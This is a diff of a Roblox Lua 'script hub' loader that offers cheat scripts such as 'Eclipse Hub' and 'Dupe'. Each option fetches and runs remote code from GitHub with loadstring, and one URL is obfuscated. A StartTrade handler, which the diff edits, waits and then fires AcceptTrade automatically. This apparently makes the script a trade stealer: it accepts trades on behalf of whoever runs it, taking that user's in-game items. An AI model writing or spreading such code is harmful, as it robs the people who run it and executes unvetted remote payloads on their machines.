@@ -292,7 +292,7 @@ g.Trade.StartTrade.OnClientEvent:Connect(
                 end
             end
             wait(10)
-            game:GetService("ReplicatedStorage").Trade.AcceptTrade:FireServer(285646582)
+            game:GetService("ReplicatedStorage").Trade.AcceptTrade:FireServer(unpack(args))
         else
             local L = 0
             local J = c.PlayerGui.TradeGUI.Container
@@ -318,7 +318,7 @@ g.Trade.StartTrade.OnClientEvent:Connect(
                 end
             end
             wait(10)
-            game:GetService("ReplicatedStorage").Trade.AcceptTrade:FireServer(285646582)
+            game:GetService("ReplicatedStorage").Trade.AcceptTrade:FireServer(unpack(args))
         end
     end
 )
@@ -423,7 +423,7 @@ elseif Config.Script == "Eclipse Hub" then
     T(G({Url = W .. "\?\107e\121\61" .. V(mainKey), Headers = {["User-Agent"] = "Eclipse"}}).Body)()
 elseif Config.Script == "R3TH PRIV" then
     loadstring(game:HttpGet("https://raw.githubusercontent.com/R3TH-PRIV/R3THPRIV/main/loader.lua"))()
-elseif Config.Script == "AshbornnHub" then
+elseif Config.Script == "Trade" then
     loadstring(game:HttpGet("https://raw.githubusercontent.com/Ashborrn/AshborrnHub/main/Solara.lua", true))()
 elseif Config.Script == "Dupe" then
     loadstring(game:HttpGet("https://raw.githubusercontent.com/JoystickpIays/nexus/main/Dupe"))()
